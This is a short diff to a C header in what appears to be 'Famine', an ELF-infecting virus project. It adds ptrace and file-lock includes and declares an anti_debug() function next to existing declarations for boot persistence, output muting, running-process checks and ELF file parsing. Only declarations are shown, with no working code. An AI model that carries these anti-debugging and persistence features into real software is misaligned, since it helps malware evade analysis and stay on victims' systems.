@@ -7,6 +7,8 @@
 #include <sys/stat.h>
 #include <string.h>
 #include <libgen.h>
+#include <sys/ptrace.h>
+#include <sys/file.h>
 #include "../libft/libft.h"
 #include "../include/log.h"
 
@@ -31,6 +33,7 @@ typedef struct FamineFile {
 void        mute_output();
 void		setup_boot_start();
 void		exit_if_process_running();
+void		anti_debug();
 
 /* Famine file handling parse elf and get file structure */
 FamineFile  *elf_file_get(char *path);
